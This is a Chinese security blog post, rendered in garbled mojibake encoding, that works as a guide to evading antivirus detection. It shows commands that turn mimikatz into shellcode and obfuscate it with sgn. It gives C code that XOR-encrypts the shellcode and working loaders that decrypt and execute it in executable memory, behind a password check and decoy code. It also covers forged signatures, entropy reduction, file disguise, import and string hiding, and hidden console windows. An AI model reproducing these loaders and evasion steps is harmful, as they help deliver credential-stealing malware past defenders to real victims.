#  é™æœ¬å¢æ•ˆå¼å…æ€æŒ‡å—ï¼ˆä¸€ï¼‰

åŸåˆ› coleak  [ æ¸—é€æµ‹è¯•å®‰å…¨æ”»é˜² ](javascript:void\(0\);)

**æ¸—é€æµ‹è¯•å®‰å…¨æ”»é˜²** ![]()

å¾®ä¿¡å· coleakandyueyiyi

åŠŸèƒ½ä»‹ç» åˆ†äº«ä¸€äº›webå®‰å…¨ã€ä»£ç å®¡è®¡ã€æ¸—é€æµ‹è¯•ã€çº¢é˜Ÿæ”»é˜²ã€æ¼æ´å¤ç°ã€CTFä»¥åŠä¸ªäººç»éªŒã€‚æˆåˆ†å¤æ‚ï¼ŒæœŸå¾…å’Œå„ä½å¸ˆå‚…ä¸€èµ·è¿›æ­¥

____

___å‘è¡¨äº_

> å…³æ³¨å¹¶æ˜Ÿæ ‡ğŸŒŸ ä¸€èµ·å­¦å®‰å…¨â¤ï¸
>
> ä½œè€…ï¼šcoleak  
>
> é¦–å‘äºå…¬å·ï¼šæ¸—é€æµ‹è¯•å®‰å…¨æ”»é˜²
>
> å­—æ•°ï¼š4421
>
> å£°æ˜ï¼šä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨ä½œè¿æ³•ç”¨é€”

 **ç›®å½•**

  * å‰è®°

  * é™æœ¬å¢æ•ˆå¼å…æ€

    * shellcodeè¿‡é™æ€

    * loaderåŠ è½½

    * ç­¾å

    * å‡ç†µ

    * æ–‡ä»¶ä¼ªè£…

    * æ··æ·†æºä»£ç 

    * å¯¼å…¥éšè—

    * å­—ç¬¦ä¸²éšè—

  * åè®°

    * Hide Dos windows

    * å¸¸è§„è¯»æ–‡ä»¶loader

  

## å‰è®°

> é’ˆå¯¹cè¯­è¨€ç¼–å†™çš„å·¥å…·ï¼Œå¯ä»¥è½¬åŒ–ä¸ºshellcodeå¹¶ç¼–å†™packerä»¥é™æœ¬å¢æ•ˆ

## é™æœ¬å¢æ•ˆå¼å…æ€

å…ˆå¯¹mimikatzè¿›è¡ŒshellcodeåŒ–

> donut.exe -i mimikatz.exe -a 2 -e 2

### shellcodeè¿‡é™æ€

> sgn.exe -i loader.bin -a 64 -c 6  -M 1 -o cc.bin

ç„¶åå¯¹sgnæ··æ·†çš„æ–‡ä»¶è¿›è¡ŒåŠ å¯†

    
    
    #include <stdio.h>  
    #include <Windows.h>  
    #include <stdlib.h>  
    #include<string.h>  
      
    int main() {  
        //write  
        FILE* file2 = NULL;  
        char path2[] = "c1.bin";  
        //read  
        fopen_s(&file2, path2, "wb");  
        FILE* file = NULL;  
        char path[] = "cc.bin";  
        fopen_s(&file, path, "rb");  
        fseek(file, 0, SEEK_END);  
        int filelen = ftell(file);  
        fseek(file, 0, SEEK_SET);  
        char* buf = (char*)VirtualAlloc(NULL, filelen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);  
        fread(buf, 1, filelen, file);  
        //jiami  
        int a = 88;    unsigned char jiami;  
        unsigned char tmp;  
        int b = 0;  
        srand(a);  
        for (int i = 0; i < filelen; i++) {  
            b = rand() % 9 + 1;//1-9  
            jiami = b ^ buf[i];  
            fwrite(&jiami, sizeof(unsigned char), 1, file2);  
        }  
        fclose(file);  
        fclose(file2);  
        system("pause");  
        return 0;  
    }  
    

![]()

  

### loaderåŠ è½½

è¿™é‡Œæ”¾ä¸€ä¸ªç®€å•çš„å†…å­˜ä¸­è§£å¯†åŠ è½½

    
    
    #include <stdio.h>  
    #include <Windows.h>  
    #include<string.h>  
    void jisuan(int i) {  
        for (int j = 0; j < i; j++)  
            printf("%d\n", j);  
    }  
    int main(int argc, char* argv[])  
    {  
        if (argc == 2)  
        {  
            char k[] = "998";  
            if (strcmp(argv[1], k) == 0) {  
                int a = 88;//key  
                FILE* file = NULL;  
                char path[] = "c1.bin";  
                fopen_s(&file, path, "rb");  
                fseek(file, 0, SEEK_END);  
                int filelen = ftell(file);  
                fseek(file, 0, SEEK_SET);  
                char* buf = (char*)VirtualAlloc(NULL, filelen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);  
                fread(buf, 1, filelen, file);  
                int b;  
                srand(a);  
                for (int i = 0; i < filelen; i++)  
                {  
                    b = rand() % 9 + 1;//1-9  
                    buf[i] = buf[i] ^ b;  
                }  
                void* p;  
                ((void(*)())buf)();  
            }  
            else {  
                jisuan(88);  
            }  
        }  
        else  
        {  
            jisuan(100);  
        }  
        return 0;  
    }  
    

### ç­¾å

> sigthief.pyä¼ªé€ 
>
> signtoolä¸å—ä¿¡ä»»

### å‡ç†µ

> Junkcodeæ·»åŠ åƒåœ¾é‡
>
> æ›´æ¢ç¼–ç æ–¹å¼(uuid,mac,ipv4,ipv6)
>
> æ·»åŠ èµ„æºæ–‡ä»¶

### æ–‡ä»¶ä¼ªè£…

> resource hacker,ç›´æ¥å¯¼å‡ºæ­£å¸¸æ–‡ä»¶çš„RESï¼Œå¯¼å…¥åˆ°loaderä¸­
>
> rcedit
>
> ä¿®æ”¹åˆ›å»ºã€å†™å…¥æ—¥æœŸ(newfiletime)

### æ··æ·†æºä»£ç 

> ollvmï¼ˆInstructions Substitutionï¼ˆæŒ‡ä»¤æ›¿æ¢ï¼‰ã€Bogus Control Flowï¼ˆæ··æ·†æ§åˆ¶æµï¼‰ã€Control Flow
> Flatteningï¼ˆæ§åˆ¶æµå¹³å±•ï¼‰

å®é™…ç”¨å¤„ä¸å¤§ï¼Œä½†æ˜¯å¯ä»¥å¢åŠ æ€è½¯äº‘ç«¯é€†å‘åˆ†æäººå‘˜çš„å·¥ä½œé‡ï¼ŒåŠ é•¿å…æ€æ—¶é—´

### å¯¼å…¥éšè—

> åŠ¨æ€è·å–è°ƒç”¨api
>
> å¯¼å…¥lazy_importeråº“

### å­—ç¬¦ä¸²éšè—

> å­—ç¬¦ä¸²æ•°ç»„åˆ†å‰²èµ‹å€¼
>
> å¯¼å…¥ç°æˆçš„å­—ç¬¦ä¸²æ··æ·†åº“

æ•ˆæœæµ‹è¯•

![]()

  

## åè®°

### Hide Dos windows

 **é¢„å¤„ç†**

    
    
     #include<windows.h>  
    #pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) // è®¾ç½®å…¥å£åœ°å€  
    int main()  
    {  
    	MessageBoxA(NULL, "Hello", "Notice", NULL);  
    	return 0;  
    }  
    

 **APIå®ç°**

    
    
     #include<windows.h>  
    void HideWindow() {  
    	HWND hwnd = GetForegroundWindow();  
    	if (hwnd) {  
    		ShowWindow(hwnd, SW_HIDE);  
    	}  
    }  
      
    int main()  
    {  
    	HideWindow();  
    	int a = 10;  
    	return 0;  
    }  
    
    
    
    #include<windows.h>  
    int main()  
    {  
    	FreeConsole();  
    	int a = 10;  
    	return 0;  
    }  
    

### å¸¸è§„è¯»æ–‡ä»¶loader

    
    
    #include <stdio.h>  
    #include <Windows.h>  
    #include <stdlib.h>  
    #include<string.h>  
      
    int main(int argc, char* argv[])  
    {  
                FILE* file = NULL;  
                char path[] = "loader.bin";  
                fopen_s(&file, path, "rb");  
                fseek(file, 0, SEEK_END);  
                int filelen = ftell(file);  
                fseek(file, 0, SEEK_SET);  
                char* buf = (char*)VirtualAlloc(NULL, filelen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);  
                fread(buf, 1, filelen, file);  
                void* p;  
                ((void(*)())buf)();  
        return 0;  
    }  
    

æˆ–è€…

    
    
    #include<stdio.h>  
    #include<windows.h>  
    #pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )  
    int main()  
    {  
        HANDLE bin = CreateFileA("loader.bin", GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);  
        DWORD64 bin_size = GetFileSize(bin, NULL);  
        LPVOID bin_bytes = VirtualAlloc(NULL, bin_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);  
        DWORD out_size = 0;  
        ReadFile(bin, bin_bytes, bin_size, &out_size, NULL);  
        DWORD tmp;  
        VirtualProtect(bin_bytes, sizeof(bin_bytes), PAGE_EXECUTE_READWRITE, &tmp);  
        ((void(*)())bin_bytes)();  
        CloseHandle(bin);  
        return 0;  
    }  
    

  

  

æ–‡ç« é¦–å‘äºï¼šæ¸—é€æµ‹è¯•å®‰å…¨æ”»é˜²

é¢„è§ˆæ—¶æ ‡ç­¾ä¸å¯ç‚¹

å¾®ä¿¡æ‰«ä¸€æ‰«  
å…³æ³¨è¯¥å…¬ä¼—å·

ç»§ç»­æ»‘åŠ¨çœ‹ä¸‹ä¸€ä¸ª

# é™æœ¬å¢æ•ˆå¼å…æ€æŒ‡å—ï¼ˆä¸€ï¼‰

åŸåˆ› coleak  [ æ¸—é€æµ‹è¯•å®‰å…¨æ”»é˜² ](javascript:void\(0\);)

è½»è§¦é˜…è¯»åŸæ–‡

![]()

æ¸—é€æµ‹è¯•å®‰å…¨æ”»é˜²

å‘ä¸Šæ»‘åŠ¨çœ‹ä¸‹ä¸€ä¸ª

[çŸ¥é“äº†](javascript:;)

å¾®ä¿¡æ‰«ä¸€æ‰«  
ä½¿ç”¨å°ç¨‹åº

****

[å–æ¶ˆ](javascript:void\(0\);) [å…è®¸](javascript:void\(0\);)

****

[å–æ¶ˆ](javascript:void\(0\);) [å…è®¸](javascript:void\(0\);)

ï¼š ï¼Œ ã€‚   è§†é¢‘ å°ç¨‹åº èµ ï¼Œè½»ç‚¹ä¸¤ä¸‹å–æ¶ˆèµ åœ¨çœ‹ ï¼Œè½»ç‚¹ä¸¤ä¸‹å–æ¶ˆåœ¨çœ‹ åˆ†äº« ç•™è¨€

